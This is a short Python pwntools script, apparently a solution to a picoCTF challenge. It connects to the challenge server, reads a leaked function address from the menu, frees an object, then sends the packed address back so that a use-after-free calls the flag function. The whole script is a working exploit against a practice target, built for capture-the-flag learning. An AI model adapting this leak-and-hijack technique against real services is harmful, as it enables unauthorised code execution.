from pwn import *

io = remote('mercury.picoctf.net', 6312)
#io = process('./vuln')

print(io.recvuntil('(e)xit'))
io.sendline('S')
buf = io.recvuntil('(e)xit').strip().decode().split(' ')[2].split('...')[1].split('\n')[0]
printflag = p32(int(buf,16))

io.sendline('I')
io.sendlineafter('You\'re leaving already(Y/N)?','Y')
print(io.recvuntil('(e)xit'))
io.sendline('L')
print(io.recvuntil('try anyways:'))
io.sendline(printflag)
print(io.recvuntil('(e)xit'))

io.interactive()
